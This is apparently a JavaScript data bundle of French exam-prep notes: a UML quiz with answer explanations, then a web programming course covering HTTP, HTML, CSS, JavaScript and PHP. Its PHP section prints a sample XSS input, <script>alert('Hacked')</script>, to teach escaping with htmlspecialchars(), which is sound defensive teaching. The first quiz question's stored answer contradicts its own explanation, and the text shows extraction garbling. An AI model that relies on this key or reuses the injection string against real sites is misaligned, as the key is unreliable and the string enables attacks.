      7. Confondre Diagramme d'Activité (workflow global) et Diagramme d'État (cycle de vie d'UN
         seul objet).
      8. Oublier les bandes d'activation sur les lignes de vie en séquence.
      9. Modéliser un acteur sans rôle (l'acteur n'est pas "Jean", mais "Client").
    10. Ajouter trop de détails inutiles : UML doit rester abstrait et lisible. Ne modélisez que ce
         qui est utile au contexte.`},{id:"12.5",c:12,t:"Expliquer un diagramme",x:`Avant d'interpréter un diagramme, nommer son point de vue :            structure (classes/composants/dé-
ploiement) ou comportement (cas d'utilisation/séquence/activités/états). Décrire les symboles et leurs
liens, puis raconter le scénario dans l'ordre ; ne pas attribuer à un diagramme des informations qu'il
ne représente pas.

    Classes : lire le nom, les attributs et les opérations ; une association exprime un lien, avec
      multiplicités lues à chaque extrémité.

    Séquence :         lire de haut en bas (temps) ; les lignes de vie représentent les participants et
      les flèches les messages. Les fragments alt, opt, loop portent respectivement choix, option et
      répétition.

    Cas d'utilisation : un acteur est un rôle externe, pas nécessairement une personne ; le rectangle
      délimite le système.

    Activités / États : suivre les transitions et leurs gardes ; une garde vraie autorise la transition,
      et un n÷ud final termine le flot ou l'état.

  ➔   Résumé rapide Notions à retenir
  Héritage (généralisation) : relation «est-un». Composition : partie fortement liée au tout, avec
  cycle de vie dépendant ; agrégation :       relation tout-partie plus faible.   Multiplicités usuelles :
  1, 0..1, ∗, 1..∗. include exprime un comportement obligatoirement réutilisé ; extend ajoute
  un comportement conditionnel au cas de base. Un diagramme UML modélise le système, il ne
  constitue pas en soi le code exécutable.`}],bh=[{q:`Dans un diagramme des cas d'utilisation, quelle armation décrit correctement la relation
include (inclusion) entre un cas A et un cas B ?`,o:["A ne peut pas s'exécuter sans exécuter B. B est obligatoire.","L'exécution de B dépend d'une condition spécifique dans A.","B hérite du comportement de A.","L'acteur doit choisir entre exécuter A ou B."],a:1,e:"Réponse : A La relation include (de A vers B) signifie que le cas A intègre obligatoirement le com- portement du cas B. L'acteur déclenche A, et systématiquement, B est appelé pour finaliser le traitement. L'option B décrit une relation extend."},{q:`Soient les classes   Auteur et Livre. Un livre est écrit par au moins un auteur, et au plus plusieurs.
Un auteur peut avoir écrit zéro ou plusieurs livres.       Comment se placent les multiplicités sur
l'association ?`,o:["Côté Livre: 0..* | Côté Auteur: 1..*","Côté Livre: 1..* | Côté Auteur: 0..*","Côté Livre: 1..1 | Côté Auteur: 0..*","Côté Livre: * | Côté Auteur: 1..1"],a:1,e:`Réponse : B) Côté Livre: 1..* | Côté Auteur: 0..* En UML, on lit la multiplicité vers la classe de destination.  "Un Auteur a écrit zéro ou plusieurs Livres" → On met 0..* du côté de Livre.  "Un Livre est écrit par un ou plusieurs Auteurs" → On met 1..* du côté de Auteur. (Moyen mnémotechnique : la cardinalité est près de l'objet "compté").`},{q:`Quelle est la différence fondamentale entre la composition (losange noir) et l'agrégation (losange
blanc) ?`,o:["L'agrégation n'autorise qu'un seul élément, la composition plusieurs.","En composition, la destruction du conteneur entraîne la destruction des composants.","En agrégation, le composant hérite des propriétés du conteneur.","La composition est une relation entre acteurs, l'agrégation entre classes."],a:1,e:"Réponse : B) La composition est une agrégation forte. Les cycles de vie sont liés. Si l'objet composite (conteneur) disparaît, ses composants disparaissent obligatoirement avec lui (ex: Maison et Pièce). L'agrégation est faible : le composant peut survivre (ex: Club de foot et Joueur)."},{q:"Dans un diagramme de séquence, comment représente-t-on un message asynchrone ?",o:["Une flèche en pointillés","Une flèche avec une pointe pleine (triangle noir)","Une flèche avec une pointe ouverte (en V)","Une ligne sans bout de flèche"],a:2,e:"Réponse : C) Flèche avec pointe ouverte  Synchrone = pointe pleine (triangle fermé).  Asynchrone = pointe ouverte (simple V). ✓  Retour (réponse) = flèche en pointillés."},{q:`Dans un diagramme d'activité, quel est le rôle du nud de bifurcation (fork ) matérialisé par une
barre noire épaisse ?`,o:["Séparer le traitement en fonction d'une condition (if/else)","Diviser le flux en plusieurs chemins exécutés   en parallèle","Synchroniser plusieurs flux avant de continuer","Mettre fin à un sous-processus"],a:1,e:"Réponse : B) Le n÷ud de fork (bifurcation) crée du parallélisme (multi-threading). Un jeton entre dans le n÷ud, et un jeton sort sur chaque branche sortante simultanément. (A décrit le n÷ud de décision/losange, C décrit la synchronisation/join)."},{q:"Parmi ces diagrammes, lequel n'est PAS un diagramme structurel (statique) ?",o:["Diagramme de déploiement","Diagramme d'objets","Diagramme de communication","Diagramme de paquetages"],a:2,e:"Réponse : C) Diagramme de communication Le diagramme de communication modélise les interactions entre objets (échange de messages), tout comme le diagramme de séquence. C'est donc un diagramme comportemental (dynamique). Déploiement, Objets, et Paquetages représentent des structures statiques."},{q:'En UML, quel symbole indique une visibilité "Protégée" (protected) pour un attribut ?',o:["+","-","#","~"],a:2,e:"Réponse : C) #  + = public  - = privé (private)  # = protégé (protected) : visible par les sous-classes. ✓  ~ = package (par défaut en Java)."},{q:'Le fragment combiné "alt" dans un diagramme de séquence correspond conceptuellement à :',o:["Une boucle d'exécution","Des instructions asynchrones","Une structure conditionnelle exclusive (if / else)","L'appel à une méthode statique"],a:2,e:`Réponse : C) if / else "alt" pour Alternatives. Il divise le cadre en opérandes séparés par des pointillés. Si la première garde est vraie, cette zone s'exécute, sinon on regarde la deuxième, etc. (mutuellement exclusif ). (Option A correspond au fragment "loop").`},{q:`Dans un diagramme d'états-transitions, une transition est étiquetée e1   [x==0] / a1(). Que cela
signifie-t-il ?`,o:["L'état e1 démarre si x=0 puis lance a1()","Sur réception de l'événement e1, SI la garde x==0 est vraie, on exécute l'action a1() et on","Si l'action a1() retourne l'événement e1, on change d'état si x==0.","e1 est un état, x==0 est la durée."],a:1,e:"Réponse : B) La syntaxe formelle d'une transition est Evénement [Garde] / Action.  e1 = l'événement (déclencheur)  [x==0] = la condition (Garde) qui doit être vraie pour franchir la transition  a1() = l'action effectuée pendant le passage"},{q:`Sur un diagramme de composants, l'icône en forme de "sucette" (lollipop, cercle entier au bout
d'un trait) désigne :`,o:["Une interface requise par le composant","Une base de données","Un n÷ud de déploiement","Une interface fournie par le composant"],a:3,e:`Réponse : D) Interface fournie  Fournie (Provided) : Le composant expose/offre des services aux autres. Symbole = Cercle plein (Lollipop).  Requise (Required) : Le composant a besoin de ces services pour fonctionner. Symbole = Demi-cercle (Socket). 11 | Mémo de Dernière Minute — UML ★ Astuce Concours Règles d'or pour les concours (QCM / Cas pratiques) : 1. Cas d'utilisation : Un acteur interagit avec le système. Ne JAMAIS faire de relation de communication (trait plein) entre deux cas d'utilisation ! 2. Include / Extend : L'include est appelé systématiquement. L'extend est optionnel. 3. Multiplicités : En UML elles se lisent "en regardant" l'autre classe. 4. Losanges :  Vide = Agrégation `}],$2={id:vh,name:yh,color:xh,sections:Sh,quiz:bh},K2=Object.freeze(Object.defineProperty({__proto__:null,color:xh,default:$2,id:vh,name:yh,quiz:bh,sections:Sh},Symbol.toStringTag,{value:"Module"})),Ch="web",Ah="Programmation Web",Eh="#60a5fa",Ph=[{id:"1.1",c:1,t:"Concepts Fondamentaux",x:`❖   Définition – Le Web vs Internet
      Internet : Le réseau informatique mondial des réseaux. Il utilise la suite de protocoles
       TCP/IP pour relier des milliards d'appareils.
      World Wide Web (WWW ou Web) : Un des services fonctionnant sur Internet. C'est
         un système hypertexte public qui permet de consulter des documents (pages web) via le
         protocole HTTP.
 ❖   Définition – Architecture Client-Serveur
 L'architecture dominante du Web où les rôles sont divisés :
     Client (Front-end) : Le navigateur Web (Chrome, Firefox). Il envoie des requêtes et
       ache les résultats. Technologies : HTML, CSS, JS.
     Serveur (Back-end) : L'ordinateur (ou logiciel) qui héberge les données, reçoit les re-
       quêtes, les traite, et renvoie une réponse. Technologies : PHP, Node.js, Python, Java, BDD
       (MySQL, MongoDB).
 ✿   Règle – Règles de l'URL (Uniform Resource Locator)
 Une URL identifie de façon unique une ressource sur le Web. Structure type :
 protocole://sous-domaine.domaine.tld/chemin/vers/ressource?param1=val1&param2=val2#ancre
 Exemple : https://www.exemple.com/articles/index.php?id=5#section2
    Protocole : https (HyperText Transfer Protocol Secure).
    Domaine : exemple.com (résolu en IP via DNS).
    Chemin (Path) : /articles/index.php (chemin sur le serveur).
    Chaîne de requête (Query String) : ?id=5 (données envoyées en GET).
    Fragment (Hash) : #section2 (ancrage géré côté client uniquement, non envoyé au
         serveur).`},{id:"1.2",c:1,t:"Le Protocole HTTP/HTTPS",x:`❖   Définition – Protocole HTTP
 HTTP (HyperText Transfer Protocol) est le protocole de base du Web. Il est sans état
 (stateless) : chaque requête est indépendante des précédentes (c'est pourquoi on utilise des
 cookies/sessions pour garder le contexte). HTTPS est la version sécurisée (chiffrée via TLS/SSL,
 port 443; HTTP utilise le port 80).
 ✿   Règle – Méthodes HTTP Principales
  Méthode Description                                                                      Idempotent ?     1

  GET            Récupérer des données (les paramètres sont dans l'URL).       Oui
  POST           Envoyer des données pour créer une ressource (dans le corps). Non
  PUT            Mettre à jour une ressource complète (ou la créer).           Oui
  PATCH          Mettre à jour partiellement une ressource.                    Non (en général)
  DELETE         Supprimer une ressource.                                      Oui
      Une requête est idempotente si l'exécuter plusieurs fois de suite a le même effet sur l'état du serveur que
 l'exécuter une seule fois.

 ✿   Règle – Codes de statut HTTP
      1xx (Information) : La requête est reçue, le processus continue.
      2xx (Succès) : 200 (OK), 201 (Created), 204 (No Content).
      3xx (Redirection) : 301 (Moved Permanently), 302 (Found/Temporary Redirect).
      4xx (Erreur Client) : 400 (Bad Request), 401 (Unauthorized), 403 (Forbidden), 404
       (Not Found).
      5xx (Erreur Serveur) : 500 (Internal Server Error), 502 (Bad Gateway), 503 (Service
         Unavailable).
 ★   Astuce Concours
 Pour les concours, retenez absolument la différence entre GET et POST : - **GET** : Limité en
 taille (taille de l'URL), données visibles, mis en cache, garde l'historique, idempotent. - **POST**
 : Pas de limite de taille stricte, données dans le body, non mis en cache, utilisé pour les données
 sensibles ou les gros volumes, non idempotent.

 Chapitre  2
HTML5 (HyperText Markup Language)`},{id:"2.1",c:2,t:"Structure de base",x:`❖   Définition – HTML
     HTML est un langage de balisage (markup) utilisé pour structurer et donner du sens au contenu
     web. Ce n'est pas un langage de programmation (pas de variables, ni boucles, ni conditions).
     ➣   Syntaxe – Structure type HTML5
 1   < ! DOCTYPE html> < ! -- D'eclare la version du HTML ( ici HTML5 ) -->
 2   <html lang= " fr " >
 3   <head>
 4         <meta charset= " UTF-8 " >
 5         <meta name= " viewport " content= " width=device-width , initial-scale=1 .0
               ">
 6         <title>Titre de l ' onglet< / title>
 7         <link rel= " stylesheet " href= " style . css " >
 8   < / head>
 9   <body>
10         <h1>Bienvenue sur ma page< / h1>
11         <p>Ceci est un paragraphe . < / p>
12   < / body>
13   < / html>

     ✿   Règle – Règles fondamentales
          Une balise s'ouvre <balise> et se ferme </balise>.
          Certaines balises sont auto-fermantes (orphelines) : <img>, <input>, <br>, <hr>, <meta>,
           <link>.
          Les attributs fournissent des infos supplémentaires (ex: href, src, id, class) et se placent
           toujours dans la balise ouvrante.
          id doit être unique dans une page.
          class peut être partagé par plusieurs éléments.

                                       2.2. BALISES SÉMANTIQUES (HTML5)`},{id:"2.2",c:2,t:"Balises Sémantiques (HTML5)",x:`❖   Définition – Sémantique
      L'utilisation de balises qui décrivent la signification du contenu, plutôt que sa présentation.
      C'est crucial pour le SEO (référencement) et l'accessibilité (lecteurs d'écran).
     Balise                         Rôle sémantique
     <header>                En-tête de la page ou d'une section (logos, titres, navigation princi-
                             pale).
     <nav>                   Section contenant les liens de navigation principaux.
     <main>                  Contenu principal et unique de la page (1 seul par page).
     <article>               Contenu indépendant et autonome (article de blog, news).
     <section>               Regroupement thématique de contenu, généralement avec un titre.
     <aside>                 Contenu indirectement lié au contenu principal (sidebar, pubs).
     <footer>                Pied de page (copyright, liens annexes, contacts).
     <figure> / <figcaption> Illustration autonome avec sa légende.`},{id:"2.3",c:2,t:"Formulaires",x:`➣   Syntaxe
 1    <form action= " traitement . php " method= " POST " >
 2        < ! -- Le label est li'e à l ' input via for= " id " -->
 3        <label for= " nom " >Nom : < / label>
 4        <input type= " text " id= " nom " name= " nom_user " required>
 6            <label for= " age " >Age : < / label>
 7            <input type= " number " id= " age " name= " age " min= " 18 " >
 9            <label>
10                  <input type= " checkbox " name= " cgu " value= " 1 " required> Accepter
                       les CGU
11            < / label>
13            <select name= " pays " id= " pays " >
14                  <option value= " ma " >Maroc< / option>
15                  <option value= " fr " >France< / option>
16            < / select>
18          <button type= " submit " >Envoyer< / button>
19    < / form>

      ☞   Attention / Piège
           L'attribut name est obligatoire sur les <input> pour que les données soient envoyées au
            serveur.
           id sert au ciblage CSS, JS, et lier un <label> (avec for). name sert au traitement serveur.
           Bouton submit : <input type="submit"> ou <button type="submit"> dans un formulaire
            déclenchent l'envoi. Un simple <button> sans type déclenche parfois un submit par défaut !

 Chapitre     3
CSS3 (Cascading Style Sheets)`},{id:"3.1",c:3,t:"Concepts de base",x:`❖   Définition – CSS
     Langage de feuilles de style en cascade utilisé pour décrire la présentation d'un document
     HTML. 3 façons d'inclure du CSS : 1. Inline (style="...") - à éviter 2. Interne (<style>
     dans le <head>) 3. Externe (<link rel="stylesheet" href="style.css">) - recommandé
     ✿   Règle – La Cascade et la Spécificité
     En cas de conflit entre règles CSS, le navigateur calcule le "poids" du sélecteur (spécificité) : 1.
     Style inline (le plus fort, 1000) 2. Sélecteur d'ID (#id, 100) 3. Sélecteur de Classe, Pseudo-
     classe, Attribut (.class, :hover, 10) 4. Sélecteur de Balise / Pseudo-élément (div, ::before,
     1) 5. Sélecteur universel (*, 0)
     Le mot-clé !important écrase la spécificité, même le style inline (mais à utiliser avec grande
     précaution).`},{id:"3.2",c:3,t:"Sélecteurs avancés",x:`➣   Syntaxe
 1   /* Basique */
 2   * { margin : 0; }                /*   Universel */
 3   p { color : red ; }              /*   Balise */
 4   . btn { border : none ; }        /*   Classe */
 5   # header { width : 100%; }       /*   ID */
 7   /* Combinateurs */
 8   div p { ... }                    /* Descendant ( tout p à l ' int'erieur de div ) */
 9   div > p { ... }                  /* Enfant direct */
10   h1 + p { ... }                   /* Fr è re adjacent imm'ediat ( le 1 er p juste apr è
        s h1 ) */
11   h1 ~ p { ... }                   /* Fr è res adjacents g'en'eraux ( tous les p apr è s
        h1 ) */
13   /* Attributs */
14   input [ type = " text " ] { ... }
15   a [ href ^= " https " ] { ... } /* Commence par https */

                                      3.3. LE MODÈLE DE BOÎTE (BOX MODEL)
16   a [ href$ = " . pdf " ] { ... } /* Finit par . pdf */
17   a [ href *= " google " ] { ... } /* Contient google */
19   /* Pseudo - classes et Pseudo -'el'ements */
20   a : hover { ... }              /* Au survol */
21   p : nth - child (2 n ) { ... } /* Les p pairs */
22   p :: before { content : "  " ; } /* Ajoute du contenu virtuel avant */`},{id:"3.3",c:3,t:"Le Modèle de Boîte (Box Model)",x:`◆   Mémoire – Les composantes de la boîte
     Tout élément HTML est une boîte rectangulaire composée de (de l'intérieur vers l'extérieur) : 1.
     Content : Le contenu réel (texte, image). 2. Padding : L'espacement intérieur (entre le contenu
     et la bordure). 3. Border : La bordure. 4. Margin : L'espacement extérieur (transparent, repousse
     les autres éléments).
     ★   Astuce Concours – L'importance de box-sizing
     Par défaut, width et height ne s'appliquent qu'au contenu. Ajouter du padding ou de la bordure
     agrandit la boîte finale. La règle d'or moderne :
 1   * {
 2         box - sizing : border - box ;
 3   }

     Avec border-box, le padding et la bordure sont inclus dans le calcul de width / height. La taille
     totale ne débordera pas.`},{id:"3.4",c:3,t:"Positionnement",x:`✿   Règle – Propriété position
          static   : Défaut. Dans le flux normal. (top, left, z-index ignorés).
          relative    : Déplacé par rapport à sa position normale. Reste dans le flux (l'espace d'o-
           rigine est conservé).
          absolute : Retiré du flux. Positionné par rapport au premier parent non statique (ou
           <body> par défaut).
          fixed : Retiré du flux. Positionné par rapport à la fenêtre du navigateur (viewport). Ne
           bouge pas au scroll.
          sticky : Hybride entre relative et fixed. Agit comme relative jusqu'à atteindre un point de
           scroll, puis devient fixed.

                                       3.5. FLEXBOX (FLEXIBLE BOX LAYOUT)`},{id:"3.5",c:3,t:"Flexbox (Flexible Box Layout)",x:`❖   Définition – Flexbox
     Conçu pour l'alignement et la répartition de l'espace dans une seule dimension (ligne OU
     colonne).
     ➣   Syntaxe
 1   . container {
 2        display : flex ;
 3        flex - direction : row ;          /* row ( d'efaut ) , column , row - reverse ,
             column - reverse */
 4        flex - wrap : wrap ;              /* nowrap ( d'efaut ) , wrap , wrap - reverse
             */
 6        /* Alignement sur l ' axe PRINCIPAL ( horizontal si flex - direction : row
             ) */
 7        justify - content : center ;     /* flex - start , flex - end , space - between ,
             space - around , space - evenly */
 9        /* Alignement sur l ' axe SECONDAIRE ( vertical si flex - direction : row )
              */
10        align - items : center ;      /* stretch ( d'efaut ) , flex - start , flex -
             end , baseline */
11   }
13   /* Sur les enfants */
14   . item {
15        flex - grow : 1;               /* Capacit'e à grandir . D'efaut 0 */
16        flex - shrink : 1;             /* Capacit'e à r'etr'ecir . D'efaut 1 */
17        flex - basis : auto ;          /* Taille de base avant r'epartition */
18        /* Raccourci : flex : 1 1 auto ; */
19        align - self : flex - end ;    /* Surcharge align - items pour cet item
              sp'ecifique */
20   }`},{id:"3.6",c:3,t:"CSS Grid Layout",x:`❖   Définition – CSS Grid
     Conçu pour les mises en page bidimensionnelles (lignes ET colonnes simultanément).
     ➣   Syntaxe
 1   . grid - container {
 2        display : grid ;
 3        /* Cr'ee 3 colonnes : 200 px , flexible ( reste de la place ) , 25% */
 4        grid - template - columns : 200 px 1 fr 25%;
 6        /* Cr'ee 2 lignes auto - dimensionn'ees */
 7        grid - template - rows : auto auto ;
 9        gap : 15 px ; /* Espacement entre les cellules ( row - gap et column - gap )
              */

10   }
12   . item1 {
13        grid - column : 1 / 3; /* S ''etend de la ligne de grille 1 à la 3 (
             occupe 2 cols ) */
14        grid - row : 1;
15   }

  Chapitre
JavaScript 4`},{id:"4.1",c:4,t:"Introduction et Types de données",x:`❖   Définition – JavaScript
 Langage interprété (souvent compilé JIT par les moteurs comme V8), faiblement et dy-
 namiquement typé, multi-paradigme (impératif, orienté objet par prototypes, fonctionnel),
 exécuté majoritairement côté client (navigateur) ou serveur (Node.js).
 ✿   Règle – Types de données (Primitives vs Références)
 Types primitifs (passés par valeur, immuables) :
                :         ,        ,
      String "texte" 'texte' \`\${variable}texte\`             (template literals)
                : , , (Not a Number),
      Number 42 3.14 NaN               Infinity
                  : ,
      Boolean true false
      Undefined   : Variable déclarée mais non initialisée.
      Null  : Absence intentionnelle de valeur (type object selon typeof, c'est un bug historique).
      Symbol   (ES6) : Identifiant unique.
      BigInt   (ES2020) : Pour les très grands entiers.
 Types Référence (passés par adresse, mutables) :
              ,       ,
      Object Array Function      (les fonctions sont des objets de première classe).`},{id:"4.2",c:4,t:"Déclaration de variables : var vs let vs const",x:`✿   Règle
  Caractéristique     var (Pre-ES6)      let (ES6)           const (ES6)
  Portée (Scope)      Fonction (Function Bloc (Block scope Bloc (Block scope
                      scope )            {})                 {})
  Ré-affectation       Oui                Oui                 Non (constante)
  Ré-déclaration      Oui                Non (erreur)        Non (erreur)
  Hoisting (Remontée) Oui, initialisé à Oui, mais zone morte Oui, zone morte tem-
                             undefined                temporelle (TDZ)        porelle

     ☞   Attention / Piège
     En utilisant const avec un objet ou un tableau, la référence est constante (on ne peut pas
     réassigner un nouvel objet), mais le contenu (mutabilité) peut changer :
 1   const arr = [1 , 2];
 2   arr . push (3) ; // OK ! arr vaut [1 , 2 , 3]
 3   // arr = [4 , 5]; // ERREUR !`},{id:"4.3",c:4,t:"Opérateurs : Égalité stricte et Type Coercion",x:`★   Astuce Concours – == vs ===
            (Égalité faible / abstraite) : JS effectue une coercition de type (conversion implicite)
          ==
         avant de comparer. Ex: 5 == '5' est true. 0 == false est true.
        === (Égalité stricte) : JS vérifie le type ET la valeur. Pas de conversion. Ex: 5 === '5' est
         false.
     Bonne pratique absolue : Toujours utiliser === et !== !
     ✿   Règle – Truthy et Falsy
     En JS, dans un contexte booléen (ex: if(...)) certaines valeurs sont évaluées comme false
     (Falsy values) : false, 0, "" (chaîne vide), null, undefined, NaN. Toutes les autres valeurs
     sont Truthy (y compris [], {} et "0").`},{id:"4.4",c:4,t:"Fonctions et Arrow Functions (ES6)",x:`➣   Syntaxe
 1   // D'eclaration classique ( hiss'ee )
 2   function add (a , b ) { return a + b ; }
 4   // Expression de fonction ( non hiss'ee )
 5   const multiply = function (a , b ) { return a * b ; };
 7   // Fonction fl'ech'ee ( Arrow Function ES6 )
 8   const divide = (a , b ) = > { return a / b ; };
 9   const divideShort = (a , b ) = > a / b ; // Return implicite si une seule
        instruction
11   // Param è tres par d'efaut
12   const greet = ( name = " Inconnu " ) = > \` Bonjour $ { name } \`;

     ◆   Mémoire – Le this et les fonctions fléchées
     Le comportement du mot-clé this est la différence majeure : - Fonction classique : this est
     défini par la façon dont la fonction est appelée (l'objet qui l'appelle). - Fonction fléchée
     : this est défini par le contexte lexical (le this englobant au moment de la déclaration). Les
     arrow functions n'ont pas leur propre this.`},{id:"4.5",c:4,t:"Tableaux (Arrays) et Méthodes Fonctionnelles",x:`✿   Règle – Méthodes de tableau essentielles
 1   const nums = [1 , 2 , 3 , 4 , 5];
 3   // Modifier le tableau original ( Mutables )
 4   nums . push (6) ;       // Ajoute à la fin
 5   nums . pop () ;         // Retire à la fin
 6   nums . unshift (0) ; // Ajoute au d'ebut
 7   nums . shift () ;       // Retire au d'ebut
 8   nums . splice (1 , 2) ; // Supprime 2 'el'ements à partir de l ' index 1
10   // Ne modifient pas le tableau original ( Immutables / Retournent nouveau
         tab )
11   const mapResult = nums . map ( x = > x * 2) ;       // [2 , 4 , 6 , 8 , 10]
12   const filterRes = nums . filter ( x = > x > 3) ;    // [4 , 5]
13   const sum = nums . reduce (( acc , curr ) = > acc + curr , 0) ; // 15
14   const found = nums . find ( x = > x === 3) ;        // 3 ( le premier trouv'e)
15   const sliceRes = nums . slice (1 , 3) ;             // Copie une portion [2 , 3]`},{id:"4.6",c:4,t:"Destructuration et Spread Operator (ES6)",x:`➣   Syntaxe
 1   // Spread Operator (...) : " D'eballe " un tableau ou un objet
 2   const arr1 = [1 , 2];
 3   const arr2 = [... arr1 , 3 , 4]; // [1 , 2 , 3 , 4]
 4   const obj1 = { a : 1 };
 5   const obj2 = { ... obj1 , b : 2 }; // { a : 1 , b : 2 }
 7   // Destructuration ( Extraire des valeurs facilement )
 8   const user = { nom : " Ali " , age : 25 };
 9   const { nom , age } = user ; // nom =" Ali " , age =25
10   // Renommer la variable : const { nom : nomUtilisateur } = user ;
12   const coords = [10 , 20 , 30];
13   const [x , y ] = coords ; // x =10 , y =20 (30 est ignor'e)`},{id:"4.7",c:4,t:"Programmation Asynchrone : Callback, Promesses, Async/Await",x:`❖   Définition – Asynchronisme
     JS est monothread (un seul fil d'exécution). Il utilise la Boucle d'événements (Event Loop)
     pour gérer les opérations longues (requêtes réseau, timers) sans bloquer l'exécution du reste du
     code.
     ➣   Syntaxe
 1   // 1. Callbacks ( Risque de Callback Hell / Pyramide of Doom )
 2   setTimeout (() = > {
 3       console . log ( " Ex'ecut'e apr è s 1 s " ) ;

 4   } , 1000) ;
 6   // 2. Promises ( ES6 ) : Objet repr'esentant la compl'etion 'eventuelle d ' une
         op'eration async
 7   fetch ( ' https :// api . example . com / data ')
 8       . then ( response = > response . json () )
 9       . then ( data = > console . log ( data ) )
10       . catch ( error = > console . error ( error ) ) ;
12   // 3. Async / Await ( ES8 ) : Sucre syntaxique par - dessus les Promesses
13   async function getData () {
14       try {
15           const response = await fetch ( ' https :// api . example . com / data ') ;
16           const data = await response . json () ;
17           console . log ( data ) ;
18       } catch ( error ) {
19           console . error ( error ) ;
20       }
21   }

     ✿   Règle – Promise States
     Une promesse a 3 états : 1. Pending : En attente. 2. Fulfilled : Résolue avec succès (déclenche
     le .then()). 3. Rejected : Rejetée avec erreur (déclenche le .catch()).`},{id:"4.8",c:4,t:"Le DOM (Document Object Model)",x:`❖   Définition – DOM
     Interface de programmation qui représente la page web HTML sous forme d'un arbre d'objets
     gérable par JS. Chaque balise, texte, attribut est un n÷ud (Node ).
     ➣   Syntaxe – Sélection et manipulation
 1   // S'election
 2   const byId = document . getElementById ( ' monId ') ;
 3   const byClass = document . getElementsByClassName ( ' maClasse ') ; //
        HTMLCollection
 4   const byQuery = document . querySelector ( '. maclasse p ') ; // Le 1 er trouv'e
 5   const allByQuery = document . querySelectorAll ( '. maclasse ') ; // NodeList (
        it'erable )
 7   // Manipulation
 8   byId . textContent = " Nouveau texte " ; // Pr'ef'erable à innerHTML si juste
        du texte ( s'ecurit'e XSS )
 9   byId . innerHTML = " < strong > Texte gras </ strong > " ;
10   byId . classList . add ( ' active ') ;
11   byId . classList . remove ( ' hidden ') ;
12   byId . classList . toggle ( ' visible ') ;
14   // Cr'eation
15   const newDiv = document . createElement ( ' div ') ;
16   newDiv . textContent = " Hello " ;
17   document . body . appendChild ( newDiv ) ; // Ajoute à la fin du body

    ➣   Syntaxe – Événements
1   const btn = document . querySelector ( '# monBouton ') ;
3   // Bonne pratique moderne : addEventListener
4   btn . addEventListener ( ' click ' , function ( event ) {
5         // event contient les infos du clic
6         event . preventDefault () ; // Emp ê che le comportement par d'efaut ( ex :
             submit form , lien )
7         event . stopPropagation () ; // Arr ê te la propagation ( bubbling ) vers
             les parents
8         console . log ( " Cliqu'e ! " ) ;
9   }) ;

    ☞   Attention / Piège
    Event Bubbling (Bouillonnement) vs Capturing : Quand on clique sur un enfant, l'événe-
    ment se propage par défaut vers ses parents (de l'intérieur vers l'extérieur). C'est le Bubbling.
    Utiliser stopPropagation() pour l'arrêter.

 Chapitre    5
PHP (Hypertext Preprocessor)`},{id:"5.1",c:5,t:"Introduction",x:`❖   Définition – PHP
     Langage de script côté serveur très populaire. Son code est exécuté sur le serveur et le résultat
     généré est renvoyé en pur HTML au client. - Fortement intégré au HTML : <?php echo "Hello";
     ?> - Extension : .php - Version actuelle recommandée : PHP 8+`},{id:"5.2",c:5,t:"Bases du langage",x:`➣   Syntaxe
 1   <? php
 2   // Variables commencent TOUJOURS par $
 3   $nom = " Ali " ;
 4   $age = 25;
 6   // Concat'enation avec le point (.)
 7   echo " Bonjour " . $nom . " ! " ;
 9   // Interpolation ( uniquement avec double guillemets "")
10   echo " Bonjour $nom ! " ; // Affiche : Bonjour Ali !
11   echo ' Bonjour $nom ! '; // Affiche : Bonjour $nom ! ( les simples
        guillemets n ' interpr è tent pas )
13   // Tableaux ( simples et associatifs )
14   $fruits = array ( " Pomme " , " Banane " , " Orange " ) ;
15   $fruits = [ " Pomme " , " Banane " ]; // Syntaxe courte moderne
16   echo $fruits [0];
18   // Tableau associatif ( Cl'e = > Valeur )
19   $user = [
20       " nom " = > " Dupont " ,
21       " age " = > 30
22   ];
23   echo $user [ " nom " ];
25   // Boucle foreach ( sp'ecialit'e de PHP )
26   foreach ( $user as $cle = > $valeur ) {
27       echo " $cle : $valeur <br > " ;

                                     5.3. SUPERGLOBALES ET FORMULAIRES
28   }
29   ?>

     ✿    Règle – Comparaison : == vs ===
     Comme en JS, PHP utilise la coercition. 0 == "0" est true. 0 == false est true. Pour vérifier
     le type, utilisez toujours l'égalité stricte ===.`},{id:"5.3",c:5,t:"Superglobales et Formulaires",x:`❖    Définition – Les Superglobales
     Ce sont des variables internes disponibles dans n'importe quel contexte global ou local (scope).
         $_GET : Tableau associatif des variables passées via l'URL.
         $_POST : Tableau associatif des variables passées via HTTP POST (corps).
         $_REQUEST : Combine $_GET, $_POST et $_COOKIE.
         $_SESSION : Variables de session persistantes côté serveur (nécessite session_start()).
         $_COOKIE : Cookies stockés côté client.
         $_FILES : Fichiers uploadés (requiert enctype="multipart/form-data" dans le <form>).
         $_SERVER : Variables d'environnement serveur (headers, paths, script locations).

     ➣    Syntaxe – Traitement sécurisé d'un formulaire POST
 1   <? php
 2   if ( $_SERVER [ " REQUEST_METHOD " ] === " POST " ) {
 3        // 1. V'erifier si la variable existe avec isset ()
 4        // 2. S'ecuriser l ' entr'ee avec htmlspecialchars () contre les failles
             XSS
 5        if ( isset ( $_POST [ ' nom_user ' ]) ) {
 6             $nom = htmlspecialchars ( $_POST [ ' nom_user ' ]) ;
 7             echo " Bienvenue " . $nom ;
 8        }
 9   }
10   ?>

     ☞    Attention / Piège
     Faille XSS (Cross-Site Scripting) : Si on fait directement echo $_POST['nom']; et
     que l'utilisateur a tapé <script>alert('Hacked')<\/script>, le script s'exécutera chez les
     autres utilisateurs. Solution : Toujours échapper les données entrantes avant achage avec
     htmlspecialchars()   .

                                5.4. CONNEXION BASE DE DONNÉES AVEC PDO`},{id:"5.4",c:5,t:"Connexion Base de Données avec PDO",x:`❖   Définition – PDO (PHP Data Objects)
     Extension PHP définissant une interface légère et consistante pour accéder aux bases de données.
     Recommandé car il supporte de multiples SGBD (MySQL, PostgreSQL, SQLite, etc.) contraire-
     ment à mysqli_* qui est spécifique à MySQL.
     ➣   Syntaxe – Requêtes préparées (Anti-Injection SQL)
 1   <? php
 2   // 1. Connexion ( avec gestion des erreurs )
 3   $dsn = " mysql : host = localhost ; dbname = mabase ; charset = utf8mb4 " ;
 4   $user = " root " ;
 5   $pass = " " ;
 7   try {
 8       $pdo = new PDO ( $dsn , $user , $pass , [
 9             PDO :: ATTR_ERRMODE = > PDO :: ERRMODE_EXCEPTION , // Mode erreur
                   strict
10             PDO :: ATTR_DEFAULT_FETCH_MODE = > PDO :: FETCH_ASSOC // R'ecup è re
                   sous forme de tableau associatif
11       ]) ;
12   } catch ( PDOException $e ) {
13       die ( " Erreur de connexion : " . $e - > getMessage () ) ;
14   }
